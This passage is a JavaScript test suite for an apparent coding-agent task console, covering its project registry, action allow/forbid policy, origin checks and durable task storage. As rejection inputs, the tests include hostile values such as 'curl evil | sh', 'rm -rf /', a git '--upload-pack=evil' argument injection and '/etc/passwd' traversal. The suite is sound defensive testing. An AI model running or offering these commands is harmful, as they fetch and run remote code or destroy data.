import assert from 'node:assert/strict';
import test from 'node:test';
import fs from 'node:fs';
import { mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import express from 'express';

import { ProjectRegistry, loadProjectRegistry } from '../server/tasks/projectRegistry.mjs';
import { PolicyGate } from '../server/tasks/policyGate.mjs';
import { ACTION_POLICY, classifyAction } from '../server/tasks/actionPolicy.mjs';
import { TaskStore } from '../server/tasks/taskStore.mjs';
import { createTaskRouter } from '../server/tasks/taskRoutes.mjs';
import {
  canSupportPass,
  createDraftTask,
  unavailableUsage,
  validateAgentRun,
  validateDevelopmentTask,
  validateEvidence,
} from '../server/tasks/types.mjs';

const tmp = () => mkdtempSync(path.join(tmpdir(), 'agent-console-'));
const validProject = (overrides = {}) => ({
  projectId: 'demo',
  repository: 'me/demo',
  localPath: '/srv/repos/demo',
  defaultBranch: 'main',
  worktreeRoot: '/srv/worktrees/demo',
  allowedAgents: ['claude-code', 'codex'],
  allowedActions: ['READ_REPO', 'CREATE_WORKTREE', 'EDIT_WORKTREE', 'RUN_TESTS', 'COMMIT', 'EDIT_PROTECTED_PATHS'],
  verifyCommands: {
    test: { command: 'npm', args: ['test'] },
    lint: { command: 'npm', args: ['run', 'lint'] },
  },
  protectedPaths: ['CLAUDE.md', '.github/workflows'],
  agentBinaries: { claude: '/opt/bin/claude' },
  ...overrides,
});
const registryOf = (...projects) => new ProjectRegistry({ projects });
const validBody = (overrides = {}) => ({
  projectId: 'demo',
  title: 'Fix week list',
  goal: 'Fix the two role-contract issues.',
  agent: 'claude-code',
  executionProfile: 'STANDARD',
  risk: 'LOW',
  requestedActions: ['READ_REPO', 'EDIT_WORKTREE'],
  ...overrides,
});

// ---------- ProjectRegistry ----------

test('registry: a valid file loads and exposes server-side values internally only', () => {
  const registry = registryOf(validProject());
  assert.equal(registry.get('demo').localPath, '/srv/repos/demo');
  assert.equal(registry.get('nope'), null);
  assert.equal(registry.get({ toString: () => 'demo' }), null);
  const publicView = JSON.stringify(registry.publicList());
  for (const secret of ['/srv/', '/opt/bin', 'npm test', 'localPath', 'verifyCommands', 'agentBinaries']) {
    assert.ok(!publicView.includes(secret), `public list leaked ${secret}`);
  }
});

test('registry: missing or malformed required fields fail closed', () => {
  const bad = [
    {},
    { projects: [] },
    { projects: 'x' },
    [validProject()],
    ...['projectId', 'repository', 'localPath', 'defaultBranch', 'worktreeRoot', 'allowedAgents', 'allowedActions', 'verifyCommands', 'protectedPaths', 'agentBinaries'].map(
      (field) => ({ projects: [Object.fromEntries(Object.entries(validProject()).filter(([k]) => k !== field))] }),
    ),
    { projects: [validProject({ localPath: 'relative/path' })] },
    { projects: [validProject({ localPath: '/srv/../etc' })] },
    { projects: [validProject({ worktreeRoot: '/srv/worktrees/../../x' })] },
    { projects: [validProject({ defaultBranch: '--upload-pack=evil' })] },
    { projects: [validProject({ defaultBranch: 'a..b' })] },
    { projects: [validProject({ repository: 'not-a-slug' })] },
    { projects: [validProject({ allowedAgents: ['gpt-ish'] })] },
    { projects: [validProject({ allowedAgents: [] })] },
    { projects: [validProject({ allowedActions: ['READ_REPO', 'MADE_UP'] })] },
    { projects: [validProject({ verifyCommands: { deploy: 'x' } })] },
    { projects: [validProject({ protectedPaths: ['/etc/passwd'] })] },
    { projects: [validProject({ protectedPaths: ['../outside'] })] },
    { projects: [validProject({ agentBinaries: { claude: 'claude' } })] },
    { projects: [validProject({ agentBinaries: { evil: '/bin/sh' } })] },
    { projects: [validProject(), validProject()] },
  ];
  for (const config of bad) {
    assert.throws(() => new ProjectRegistry(config), undefined, JSON.stringify(config).slice(0, 120));
  }
});

test('registry: a project file cannot allow a FORBIDDEN_IN_V1 action', () => {
  for (const action of ['MERGE', 'DEPLOY', 'AGENT_NETWORK', 'SECRETS']) {
    assert.throws(() => registryOf(validProject({ allowedActions: ['READ_REPO', action] })), /FORBIDDEN_IN_V1/);
  }
});

test('registry: loadProjectRegistry rejects a missing file and malformed JSON', () => {
  const dir = tmp();
  try {
    assert.throws(() => loadProjectRegistry(path.join(dir, 'missing.json')), /could not be read/);
    const file = path.join(dir, 'projects.local.json');
    writeFileSync(file, '{ not json');
    assert.throws(() => loadProjectRegistry(file), /could not be read/);
    writeFileSync(file, JSON.stringify({ projects: [validProject()] }));
    assert.equal(loadProjectRegistry(file).get('demo').projectId, 'demo');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('registry: the committed example file is itself valid', () => {
  const example = JSON.parse(readFileSync(new URL('../projects.local.example.json', import.meta.url), 'utf8'));
  assert.ok(new ProjectRegistry(example).get('command-center'));
});

// ---------- Action policy + PolicyGate ----------

test('action policy: baseline categories, and unknown actions classify as null', () => {
  const expected = {
    AUTO_ALLOWED: ['READ_REPO', 'CREATE_WORKTREE', 'EDIT_WORKTREE', 'RUN_TESTS', 'RUN_LINT', 'RUN_BUILD', 'COMMIT', 'PUSH_BRANCH', 'CREATE_PR'],
    CONTROL_PLANE_APPROVAL: ['EDIT_PROTECTED_PATHS', 'REVIEW_DECISION'],
    EXPLICIT_HUMAN_APPROVAL: ['INSTALL_DEPENDENCIES', 'CHANGE_ALLOWLIST', 'CHANGE_POLICY'],
    FORBIDDEN_IN_V1: ['AGENT_NETWORK', 'MERGE', 'DEPLOY', 'PRODUCTION_CONFIG', 'IAM', 'SECRETS', 'DELETE_RESOURCE', 'BILLING_CHANGE'],
  };
  for (const [category, actions] of Object.entries(expected)) {
    for (const action of actions) assert.equal(classifyAction(action), category, action);
  }
  assert.equal(Object.keys(ACTION_POLICY).length, Object.values(expected).flat().length);
  for (const unknown of ['rm_rf', 'merge', '', undefined, null, 5, '__proto__', 'constructor', 'toString']) {
    assert.equal(classifyAction(unknown), null, String(unknown));
  }
  assert.ok(Object.isFrozen(ACTION_POLICY));
});

const gate = new PolicyGate();
const registry = registryOf(validProject());
const evaluate = (body) => gate.evaluateCreate({ body, registry });

test('policy gate: an allowed agent and allowed actions pass; defaults are applied', () => {
  const ok = evaluate(validBody());
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.input.requestedActions, ['READ_REPO', 'EDIT_WORKTREE']);
  assert.deepEqual(ok.approvalRequired, []);

  const defaults = evaluate({ projectId: 'demo', title: 't', goal: 'g', agent: 'codex', risk: 'MEDIUM' });
  assert.equal(defaults.ok, true);
  assert.equal(defaults.input.executionProfile, 'STANDARD');
  assert.equal(defaults.input.workstream, 'general');
  // Defaults never include approval-category actions.
  assert.ok(!defaults.input.requestedActions.includes('EDIT_PROTECTED_PATHS'));
});

test('policy gate: approval-category actions are accepted only if the project lists them, and are flagged', () => {
  const ok = evaluate(validBody({ requestedActions: ['EDIT_PROTECTED_PATHS'] }));
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.approvalRequired, [{ action: 'EDIT_PROTECTED_PATHS', category: 'CONTROL_PLANE_APPROVAL' }]);
  const notListed = evaluate(validBody({ requestedActions: ['INSTALL_DEPENDENCIES'] }));
  assert.equal(notListed.code, 'ACTION_NOT_ALLOWED');
});

test('policy gate: disallowed agent, unknown agent and unknown project are rejected', () => {
  const narrow = new ProjectRegistry({ projects: [validProject({ allowedAgents: ['codex'] })] });
  assert.equal(gate.evaluateCreate({ body: validBody(), registry: narrow }).code, 'AGENT_NOT_ALLOWED');
  assert.equal(evaluate(validBody({ agent: 'gemini' })).code, 'UNKNOWN_AGENT');
  const unknownProject = evaluate(validBody({ projectId: 'ghost' }));
  assert.equal(unknownProject.status, 404);
  assert.equal(unknownProject.code, 'UNKNOWN_PROJECT');
});

test('policy gate: FORBIDDEN_IN_V1 and unknown actions are rejected, even when listed together with valid ones', () => {
  for (const action of ['MERGE', 'DEPLOY', 'PRODUCTION_CONFIG', 'IAM', 'SECRETS', 'DELETE_RESOURCE', 'BILLING_CHANGE', 'AGENT_NETWORK']) {
    const result = evaluate(validBody({ requestedActions: ['READ_REPO', action] }));
    assert.equal(result.ok, false, action);
    assert.equal(result.code, 'ACTION_FORBIDDEN', action);
    assert.equal(result.status, 403);
  }
  for (const action of ['rm -rf /', 'merge', 'constructor', '', 5, null]) {
    const result = evaluate(validBody({ requestedActions: [action] }));
    assert.equal(result.ok, false, String(action));
    assert.ok(['UNKNOWN_ACTION', 'MALFORMED_TASK'].includes(result.code), String(action));
  }
});

test('policy gate: invalid profile, risk and malformed tasks are rejected', () => {
  assert.equal(evaluate(validBody({ executionProfile: 'claude-opus-5-5' })).code, 'INVALID_PROFILE');
  assert.equal(evaluate(validBody({ risk: 'EXTREME' })).code, 'MALFORMED_TASK');
  assert.equal(evaluate(validBody({ risk: undefined })).code, 'MALFORMED_TASK');
  for (const body of [null, undefined, [], 'text', 5]) assert.equal(evaluate(body).code, 'MALFORMED_TASK');
  for (const field of ['projectId', 'title', 'goal', 'agent']) {
    assert.equal(evaluate(validBody({ [field]: undefined })).code, 'MALFORMED_TASK', field);
    assert.equal(evaluate(validBody({ [field]: '   ' })).code, 'MALFORMED_TASK', field);
    assert.equal(evaluate(validBody({ [field]: 7 })).code, 'MALFORMED_TASK', field);
  }
  assert.equal(evaluate(validBody({ title: 'x'.repeat(201) })).code, 'MALFORMED_TASK');
  assert.equal(evaluate(validBody({ goal: 'x'.repeat(20_001) })).code, 'MALFORMED_TASK');
  assert.equal(evaluate(validBody({ workstream: '../../etc' })).code, 'MALFORMED_TASK');
  assert.equal(evaluate(validBody({ requestedActions: 'READ_REPO' })).code, 'MALFORMED_TASK');
});

// ---------- Browser path / command isolation ----------

const SERVER_OWNED = {
  cwd: '/etc',
  localPath: '/Users/someone/repo',
  filesystemPath: '/',
  worktreePath: '/tmp/x',
  binaryPath: '/bin/sh',
  command: 'rm -rf ~',
  verifyCommand: 'curl evil | sh',
  verifyCommands: { test: 'x' },
  setupCommand: 'x',
  shell: '/bin/bash',
  branch: '../../refs/heads/main',
  executionBranch: 'agent/x',
  branchPath: '/x',
  baseSha: 'a'.repeat(40),
  status: 'COMPLETED',
  review: { decision: 'APPROVED' },
  taskId: 'CC-20260101-deadbeef',
};

test('policy gate: every server-owned field is rejected, one by one and fail-closed', () => {
  for (const [key, value] of Object.entries(SERVER_OWNED)) {
    const result = evaluate(validBody({ [key]: value }));
    assert.equal(result.ok, false, key);
    assert.equal(result.status, 400, key);
    assert.equal(result.code, 'SERVER_OWNED_FIELD', key);
  }
  // Rejection is an allowlist, not a deny-list: an unlisted spelling fails too.
  for (const key of ['workingDir', 'exe', 'argv', 'env', 'whatever']) {
    assert.equal(evaluate(validBody({ [key]: '/x' })).ok, false, key);
  }
});

// ---------- TaskStore ----------

const draft = (id = 'CC-20260102-0000000a', createdAt = '2026-01-02T00:00:00.000Z') =>
  createDraftTask({ taskId: id, input: evaluate(validBody()).input, project: registry.get('demo'), now: createdAt });

test('task contract: a created draft is structurally valid, DRAFT, PENDING review, unresolved base SHA', () => {
  const task = draft();
  assert.deepEqual(validateDevelopmentTask(task), []);
  assert.equal(task.status, 'DRAFT');
  assert.equal(task.baseSha, null);
  assert.equal(task.baseBranch, 'main');
  assert.deepEqual(task.review, { decision: 'PENDING', decidedAt: null, note: null });
  assert.deepEqual(task.runIds, []);
  assert.ok(!('startedAt' in task) && !('commitSha' in task) && !('pr' in task));
  assert.ok(validateDevelopmentTask({ ...task, status: 'MERGED' }).length > 0);
  assert.ok(validateDevelopmentTask({ ...task, review: { decision: 'DONE', decidedAt: null, note: null } }).length > 0);
});

test('task store: create, read, list, and persistence across a reopened store', () => {
  const dir = tmp();
  try {
    const store = new TaskStore({ dir });
    const a = draft('CC-20260102-0000000a', '2026-01-02T00:00:00.000Z');
    const b = draft('CC-20260103-0000000b', '2026-01-03T00:00:00.000Z');
    store.create(a);
    store.create(b);
    assert.throws(() => store.create(a), /already exists/);
    assert.deepEqual(store.get(a.taskId), a);
    assert.equal(store.get('CC-20260109-00000000'), null);
    assert.throws(() => store.get('../../etc/passwd'), /Invalid taskId/);

    const reopened = new TaskStore({ dir });
    const { tasks, unreadable } = reopened.list();
    assert.deepEqual(tasks.map((t) => t.taskId), [b.taskId, a.taskId]); // newest first
    assert.deepEqual(unreadable, []);
    assert.equal(readdirSync(dir).filter((n) => n.includes('.tmp-')).length, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('task store: refuses to persist an invalid task, and reports corrupt files instead of hiding them', () => {
  const dir = tmp();
  try {
    const store = new TaskStore({ dir });
    assert.throws(() => store.create({ ...draft(), status: 'MERGED' }), /invalid task/);
    writeFileSync(path.join(dir, 'CC-20260105-0000000c.json'), '{ broken');
    writeFileSync(path.join(dir, 'CC-20260106-0000000d.json'), JSON.stringify({ ...draft('CC-20260106-0000000d'), status: 'WAT' }));
    store.create(draft());
    const { tasks, unreadable } = store.list();
    assert.equal(tasks.length, 1);
    assert.deepEqual(unreadable.sort(), ['CC-20260105-0000000c.json', 'CC-20260106-0000000d.json']);
    assert.throws(() => store.get('CC-20260105-0000000c'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('task store: a failed write leaves the previous file intact and no temp file behind (atomic rename)', () => {
  const dir = tmp();
  try {
    const original = draft();
    new TaskStore({ dir }).create(original);
    const before = readFileSync(path.join(dir, `${original.taskId}.json`), 'utf8');

    for (const failing of ['renameSync', 'writeSync', 'fsyncSync']) {
      const flaky = { ...fs, [failing]: () => { throw new Error(`simulated ${failing} failure`); } };
      // Recovery rewrites nothing for a DRAFT task, so constructing is safe; force an update path:
      const store = new TaskStore({ dir, fsImpl: flaky });
      assert.throws(() => store.create(draft('CC-20260110-0000000e')), /simulated/);
      assert.equal(readFileSync(path.join(dir, `${original.taskId}.json`), 'utf8'), before);
      assert.ok(!fs.existsSync(path.join(dir, 'CC-20260110-0000000e.json')), failing);
      assert.equal(readdirSync(dir).filter((n) => n.includes('.tmp-')).length, 0, `${failing} left a temp file`);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('restart: every active status reloads as UNKNOWN; terminal and DRAFT statuses are untouched', () => {
  const dir = tmp();
  try {
    const store = new TaskStore({ dir });
    const statuses = ['DRAFT', 'QUEUED', 'STARTING', 'RUNNING', 'VERIFYING', 'COMPLETED', 'FAILED', 'CANCELLED', 'BLOCKED', 'UNKNOWN'];
    statuses.forEach((status, i) => {
      const id = `CC-20260101-0000000${i}`;
      store.create({ ...draft(id), status, startedAt: status === 'RUNNING' ? '2026-01-02T01:00:00.000Z' : undefined });
    });

    let tick = 0;
    const reopened = new TaskStore({ dir, now: () => `2026-02-01T00:00:0${tick++}.000Z` });
    const byStatus = Object.fromEntries(reopened.list().tasks.map((t) => [t.taskId.slice(-1), t.status]));
    assert.deepEqual(byStatus, {
      0: 'DRAFT', 1: 'UNKNOWN', 2: 'UNKNOWN', 3: 'UNKNOWN', 4: 'UNKNOWN',
      5: 'COMPLETED', 6: 'FAILED', 7: 'CANCELLED', 8: 'BLOCKED', 9: 'UNKNOWN',
    });
    assert.deepEqual(reopened.recoveredTaskIds.sort(), ['CC-20260101-00000001', 'CC-20260101-00000002', 'CC-20260101-00000003', 'CC-20260101-00000004']);
    // Never converted to a terminal outcome:
    assert.ok(!reopened.list().tasks.some((t) => t.taskId.endsWith('3') && ['FAILED', 'COMPLETED'].includes(t.status)));
    // Persisted, not just masked in memory:
    assert.equal(JSON.parse(readFileSync(path.join(dir, 'CC-20260101-00000003.json'), 'utf8')).status, 'UNKNOWN');
    // startedAt evidence is kept for a human to judge:
    assert.equal(reopened.get('CC-20260101-00000003').startedAt, '2026-01-02T01:00:00.000Z');
    // A second restart is stable.
    assert.equal(new TaskStore({ dir }).recoveredTaskIds.length, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------- AgentRun / Evidence contracts ----------

test('agent run: missing cost stays UNAVAILABLE and can never be $0', () => {
  const run = {
    runId: 'RUN-20260102-0000000a',
    taskId: 'CC-20260102-0000000a',
    agent: 'codex',
    status: 'RUNNING',
    usage: unavailableUsage(),
  };
  assert.deepEqual(validateAgentRun(run), []);
  assert.deepEqual(unavailableUsage(), { tokens: null, costUsd: null, grade: 'UNAVAILABLE' });
  assert.ok(validateAgentRun({ ...run, usage: { tokens: null, costUsd: 0, grade: 'UNAVAILABLE' } }).length > 0);
  assert.ok(validateAgentRun({ ...run, usage: { tokens: { input: 1, output: 2 }, costUsd: null, grade: 'UNAVAILABLE' } }).length > 0);
  assert.deepEqual(validateAgentRun({ ...run, usage: { tokens: { input: 10, output: 5, cached: 2 }, costUsd: null, grade: 'OBSERVED' } }), []);
  assert.deepEqual(validateAgentRun({ ...run, usage: { tokens: null, costUsd: 0.12, grade: 'ESTIMATED' } }), []);
  assert.ok(validateAgentRun({ ...run, usage: { tokens: null, costUsd: -1, grade: 'ESTIMATED' } }).length > 0);
  assert.ok(validateAgentRun({ ...run, status: 'DONE' }).length > 0);
});

test('evidence: only LOCALLY_VERIFIED or stronger can support a PASS badge', () => {
  const pass = { AGENT_CLAIM: false, RUNTIME_OBSERVED: false, LOCALLY_VERIFIED: true, GITHUB_VERIFIED: true, EXTERNAL_AUTHORITATIVE: true, UNKNOWN: false };
  for (const [grade, expected] of Object.entries(pass)) assert.equal(canSupportPass(grade), expected, grade);
  assert.equal(canSupportPass('MADE_UP'), false);
  assert.equal(canSupportPass(undefined), false);

  const evidence = {
    evidenceId: 'ev-1',
    taskId: 'CC-20260102-0000000a',
    kind: 'command_result',
    grade: 'LOCALLY_VERIFIED',
    data: { command: 'npm test', exitCode: 0 },
    observedAt: '2026-01-02T00:00:00.000Z',
  };
  assert.deepEqual(validateEvidence(evidence), []);
  assert.ok(validateEvidence({ ...evidence, grade: 'PASS' }).length > 0);
  assert.ok(validateEvidence({ ...evidence, kind: 'tests_passed' }).length > 0);
  assert.ok(validateEvidence({ ...evidence, data: undefined }).length > 0);
});

// ---------- /api/tasks ----------

async function withApp({ registry: reg = registry, dir = tmp(), expectedOrigin = 'http://127.0.0.1:3000' } = {}, run) {
  const store = new TaskStore({ dir });
  const app = express();
  app.use(express.json());
  app.use('/api/tasks', createTaskRouter({ store, registry: reg, expectedOrigin, idFactory: () => `CC-20260102-${Math.random().toString(16).slice(2, 10).padEnd(8, '0')}` }));
  const server = await new Promise((resolve) => { const s = app.listen(0, '127.0.0.1', () => resolve(s)); });
  const base = `http://127.0.0.1:${server.address().port}/api/tasks`;
  try {
    return await run({ base, store, dir });
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
}
const post = (base, body, headers = {}) =>
  fetch(base, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: typeof body === 'string' ? body : JSON.stringify(body) });

test('api: POST creates a DRAFT task, GET returns it, and nothing else happens', async () => {
  await withApp(undefined, async ({ base, dir }) => {
    const res = await post(base, validBody());
    assert.equal(res.status, 201);
    const { task, approvalRequired } = await res.json();
    assert.equal(task.status, 'DRAFT');
    assert.equal(task.baseBranch, 'main');
    assert.equal(task.baseSha, null);
    assert.deepEqual(approvalRequired, []);
    assert.ok(!JSON.stringify(task).includes('/srv/'), 'task must not carry registry paths');

    const one = await (await fetch(`${base}/${task.taskId}`)).json();
    assert.deepEqual(one.task, task);
    const list = await (await fetch(base)).json();
    assert.deepEqual(list.tasks.map((t) => t.taskId), [task.taskId]);
    // Only the task file was written: no worktree, no event log, no process side effects.
    assert.deepEqual(readdirSync(dir), [`${task.taskId}.json`]);
  });
});

test('api: browser-supplied paths, commands, binaries and branches are rejected with 400 and nothing is stored', async () => {
  await withApp(undefined, async ({ base, dir }) => {
    for (const [key, value] of Object.entries(SERVER_OWNED)) {
      const res = await post(base, validBody({ [key]: value }));
      assert.equal(res.status, 400, key);
      assert.equal((await res.json()).code, 'SERVER_OWNED_FIELD', key);
    }
    assert.deepEqual(readdirSync(dir), []);
  });
});

test('api: policy failures map to 403/404 and nothing is stored', async () => {
  await withApp(undefined, async ({ base, dir }) => {
    assert.equal((await post(base, validBody({ requestedActions: ['MERGE'] }))).status, 403);
    assert.equal((await post(base, validBody({ requestedActions: ['NOPE'] }))).status, 400);
    assert.equal((await post(base, validBody({ projectId: 'ghost' }))).status, 404);
    assert.equal((await post(base, '{"projectId":')).status, 400); // malformed JSON
    assert.deepEqual(readdirSync(dir), []);
  });
});

test('api: POST requires application/json and a loopback origin; GET rejects foreign origins', async () => {
  await withApp(undefined, async ({ base, dir }) => {
    const wrongType = await fetch(base, { method: 'POST', headers: { 'content-type': 'text/plain' }, body: JSON.stringify(validBody()) });
    assert.equal(wrongType.status, 415);
    const foreign = await post(base, validBody(), { origin: 'https://evil.example' });
    assert.equal(foreign.status, 403);
    assert.equal((await fetch(base, { headers: { origin: 'https://evil.example' } })).status, 403);
    assert.equal((await post(base, validBody(), { origin: 'http://127.0.0.1:3000' })).status, 201);
    assert.equal(readdirSync(dir).length, 1);
  });
});

test('api: a malformed taskId is rejected before touching the filesystem; unknown ids are 404', async () => {
  await withApp(undefined, async ({ base }) => {
    assert.equal((await fetch(`${base}/..%2F..%2Fetc%2Fpasswd`)).status, 400);
    assert.equal((await fetch(`${base}/not-an-id`)).status, 400);
    assert.equal((await fetch(`${base}/CC-20260109-00000000`)).status, 404);
  });
});

test('api: with no usable registry, creation fails closed (503) but reads still work', async () => {
  await withApp({ registry: null }, async ({ base, store }) => {
    const res = await post(base, validBody());
    assert.equal(res.status, 503);
    assert.equal((await res.json()).code, 'REGISTRY_UNAVAILABLE');
    assert.deepEqual((await (await fetch(base)).json()).tasks, []);
    assert.equal(store.list().tasks.length, 0);
  });
});

test('api: approval-category actions are flagged in the response, never silently granted', async () => {
  await withApp(undefined, async ({ base }) => {
    const res = await post(base, validBody({ requestedActions: ['EDIT_PROTECTED_PATHS'] }));
    assert.equal(res.status, 201);
    const { approvalRequired } = await res.json();
    assert.deepEqual(approvalRequired, [{ action: 'EDIT_PROTECTED_PATHS', category: 'CONTROL_PLANE_APPROVAL' }]);
  });
});

test('no execution: the new modules never import process, git or network APIs', () => {
  const dir = new URL('../server/tasks/', import.meta.url);
  for (const name of readdirSync(dir)) {
    const source = readFileSync(new URL(name, dir), 'utf8');
    assert.ok(!/child_process|execFile|spawn\(|(?<!\.)\bexec\(|node:net|node:http|fetch\(/.test(source), `${name} must not execute anything`);
  }
});

// ---------- Three foundation blockers: persisted authority, origin, durability ----------

test('persisted actions: forbidden actions are rejected by get and reported unreadable by list', () => {
  const dir = tmp();
  try {
    const store = new TaskStore({ dir });
    for (const action of ['AGENT_NETWORK', 'MERGE', 'DEPLOY', 'PRODUCTION_CONFIG', 'IAM', 'SECRETS', 'DELETE_RESOURCE', 'BILLING_CHANGE']) {
      const task = { ...draft(), allowedActions: ['READ_REPO', action] };
      const file = path.join(dir, `${task.taskId}.json`);
      const bytes = JSON.stringify(task);
      writeFileSync(file, bytes);
      assert.ok(validateDevelopmentTask(task).length > 0, action);
      assert.throws(() => store.get(task.taskId), /invalid/, action);
      assert.deepEqual(store.list(), { tasks: [], unreadable: [`${task.taskId}.json`] }, action);
      assert.equal(readFileSync(file, 'utf8'), bytes, 'invalid actions must not be silently stripped');
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('persisted actions: unknown and prototype names cannot become valid task authority', () => {
  const dir = tmp();
  try {
    const store = new TaskStore({ dir });
    for (const action of ['SOMETHING_NEW', 'NO_SUCH_ACTION', 'constructor', '__proto__']) {
      const task = { ...draft(), allowedActions: ['READ_REPO', action] };
      writeFileSync(path.join(dir, `${task.taskId}.json`), JSON.stringify(task));
      assert.throws(() => store.get(task.taskId), /invalid/, action);
      assert.deepEqual(store.list(), { tasks: [], unreadable: [`${task.taskId}.json`] }, action);
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('persisted actions: known auto and approval actions remain valid data', () => {
  const dir = tmp();
  try {
    const task = { ...draft(), allowedActions: ['READ_REPO', 'EDIT_PROTECTED_PATHS', 'REVIEW_DECISION', 'INSTALL_DEPENDENCIES', 'CHANGE_ALLOWLIST', 'CHANGE_POLICY'] };
    const store = new TaskStore({ dir });
    assert.deepEqual(validateDevelopmentTask(task), []);
    store.create(task);
    assert.deepEqual(store.get(task.taskId).allowedActions, task.allowedActions);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('api exact origin: foreign loopback ports, localhost alias and internet origins are rejected', async () => {
  await withApp(undefined, async ({ base, dir }) => {
    for (const origin of ['http://127.0.0.1:4999', 'http://localhost:3000', 'http://localhost:5173', 'https://evil.example', 'null']) {
      assert.equal((await post(base, validBody(), { origin })).status, 403, origin);
      assert.equal((await fetch(base, { headers: { origin } })).status, 403, origin);
    }
    assert.deepEqual(readdirSync(dir), []);
    assert.equal((await post(base, validBody(), { origin: 'http://127.0.0.1:3000' })).status, 201);
  });
});

test('api exact origin: Referer-derived origins follow the same rule and malformed Referers fail closed', async () => {
  await withApp(undefined, async ({ base, dir }) => {
    for (const referer of ['http://127.0.0.1:4999/page', 'http://localhost:3000/page', 'https://evil.example/page', 'not-a-url']) {
      assert.equal((await post(base, validBody(), { referer })).status, 403, referer);
      assert.equal((await fetch(base, { headers: { referer } })).status, 403, referer);
    }
    assert.deepEqual(readdirSync(dir), []);
    const created = await post(base, validBody(), { referer: 'http://127.0.0.1:3000/tasks' });
    assert.equal(created.status, 201);
    const { task } = await created.json();
    assert.equal((await fetch(`${base}/${task.taskId}`, { headers: { referer: 'http://localhost:3000/tasks' } })).status, 403);
    assert.equal((await fetch(`${base}/${task.taskId}`, { headers: { referer: 'http://127.0.0.1:3000/tasks' } })).status, 200);
  });
});

test('api exact origin: no Origin and no Referer intentionally supports local non-browser callers', async () => {
  await withApp(undefined, async ({ base }) => {
    const res = await post(base, validBody());
    assert.equal(res.status, 201);
    const { task } = await res.json();
    assert.equal((await fetch(base)).status, 200);
    assert.equal((await fetch(`${base}/${task.taskId}`)).status, 200);
  });
});

test('api exact origin: the injected expected origin is used and invalid configuration fails closed', async () => {
  await withApp({ expectedOrigin: 'http://localhost:4321' }, async ({ base }) => {
    assert.equal((await post(base, validBody(), { origin: 'http://127.0.0.1:3000' })).status, 403);
    assert.equal((await post(base, validBody(), { origin: 'http://localhost:4321' })).status, 201);
  });
  for (const expectedOrigin of ['https://evil.example', 'not-a-url', null]) {
    await withApp({ expectedOrigin }, async ({ base, dir }) => {
      assert.equal((await post(base, validBody())).status, 403);
      assert.equal((await fetch(base)).status, 403);
      assert.deepEqual(readdirSync(dir), []);
    });
  }
});

// Real filesystem writes with only writeSync fault-injected; persistence and
// cleanup assertions exercise TaskStore rather than the fake's call counts.
function limitedWrites(limit) {
  return { ...fs, writeSync(fd, payload, offset = 0, length = payload.length - offset) {
    const bytes = Buffer.isBuffer(payload) ? payload : Buffer.from(payload, 'utf8');
    return fs.writeSync(fd, bytes, offset, Math.min(limit, length));
  } };
}

test('durability: legitimate short writes persist complete JSON with no temporary file', () => {
  const dir = tmp();
  try {
    const task = draft();
    const store = new TaskStore({ dir, fsImpl: limitedWrites(16) });
    store.create(task);
    assert.deepEqual(new TaskStore({ dir }).get(task.taskId), task);
    assert.deepEqual(readdirSync(dir), [`${task.taskId}.json`]);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('durability: partial writes preserve multi-byte UTF-8 text across byte boundaries', () => {
  const dir = tmp();
  try {
    const task = { ...draft(), title: '修正 Agent Console 權限邊界', goal: '保留繁體中文與 emoji 🛡️' };
    new TaskStore({ dir, fsImpl: limitedWrites(1) }).create(task);
    const actual = readFileSync(path.join(dir, `${task.taskId}.json`));
    assert.deepEqual(actual, Buffer.from(JSON.stringify(task, null, 2), 'utf8'));
    assert.deepEqual(new TaskStore({ dir }).get(task.taskId), task);
    assert.deepEqual(readdirSync(dir), [`${task.taskId}.json`]);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

function partialThenFail(failure) {
  let first = true;
  return { ...fs, writeSync(fd, payload, offset = 0, length = payload.length - offset) {
    if (!first) {
      if (failure === 'throw') throw new Error('simulated partial-write failure');
      return failure;
    }
    first = false;
    const bytes = Buffer.isBuffer(payload) ? payload : Buffer.from(payload, 'utf8');
    return fs.writeSync(fd, bytes, offset, Math.min(16, length));
  } };
}

test('durability: partial write then exception preserves existing tasks and removes temporary files', () => {
  const dir = tmp();
  try {
    const original = draft();
    new TaskStore({ dir }).create(original);
    const file = path.join(dir, `${original.taskId}.json`);
    const before = readFileSync(file);
    const store = new TaskStore({ dir, fsImpl: partialThenFail('throw') });
    assert.throws(() => store.create(draft('CC-20260102-0000000b')), /partial-write failure/);
    assert.deepEqual(readFileSync(file), before);
    assert.deepEqual(store.get(original.taskId), original);
    assert.deepEqual(readdirSync(dir), [`${original.taskId}.json`]);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('durability: restart recovery failure surfaces and preserves the original RUNNING task byte-for-byte', () => {
  const dir = tmp();
  try {
    const original = { ...draft(), status: 'RUNNING', startedAt: '2026-01-02T01:00:00.000Z' };
    const live = new TaskStore({ dir });
    live.create(original);
    const file = path.join(dir, `${original.taskId}.json`);
    const before = readFileSync(file);
    let reopened;
    assert.throws(() => { reopened = new TaskStore({ dir, fsImpl: partialThenFail('throw') }); }, /partial-write failure/);
    assert.equal(reopened, undefined, 'failed construction must not expose a successful recoveredTaskIds result');
    assert.deepEqual(readFileSync(file), before);
    assert.deepEqual(live.get(original.taskId), original);
    assert.deepEqual(readdirSync(dir), [`${original.taskId}.json`]);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('durability: zero or invalid progress fails recovery without replacing the original task', () => {
  const dir = tmp();
  try {
    const original = { ...draft(), status: 'RUNNING' };
    const live = new TaskStore({ dir });
    live.create(original);
    const file = path.join(dir, `${original.taskId}.json`);
    const before = readFileSync(file);
    for (const failure of [0, -1, NaN, undefined]) {
